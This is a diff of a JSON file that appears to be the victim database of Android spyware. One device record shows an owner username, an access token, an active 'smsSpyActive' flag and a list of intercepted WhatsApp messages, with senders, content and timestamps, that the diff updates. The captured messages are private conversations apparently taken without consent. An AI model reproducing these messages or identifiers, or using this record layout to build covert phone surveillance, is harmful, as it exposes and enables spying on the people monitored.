@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1775927247437,
+    "lastSeen": 1775927250240,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (3 pesan): ~ tapzyUrPrblm",
+        "content": "npa emng,habis jir gw buat beli akun...",
+        "time": "12/04 00:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775927251786
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
+        "content": "‎2 pesan baru",
+        "time": "12/04 00:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775927249458
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (2 pesan): ~ regàcmèldlv/𝐂𝐈𝐓𝐄𝐍𝟗/ROR",
+        "content": "800 ☠️🗿",
+        "time": "12/04 00:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775927249448
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
+        "content": "~ k: 💟 Stiker",
+        "time": "12/04 00:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775927248873
+      },
       {
         "appName": "WhatsApp",
         "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈: ~ k",
@@ -4091,38 +4123,6 @@
         "time": "11/04 23:02",
         "pkg": "com.whatsapp",
         "receivedAt": 1775923348580
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
-        "content": "~ dapa: ganti ke cc",
-        "time": "11/04 23:02",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775923347899
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈: ~ dapa",
-        "content": "ganti ke cc",
-        "time": "11/04 23:02",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775923347797
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
-        "content": "~ Rusjie: gua cwo bg",
-        "time": "11/04 23:02",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775923340121
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈: ~ Rusjie",
-        "content": "gua cwo bg",
-        "time": "11/04 23:02",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775923340033
       }
     ],
     "galleryPhotos": [],
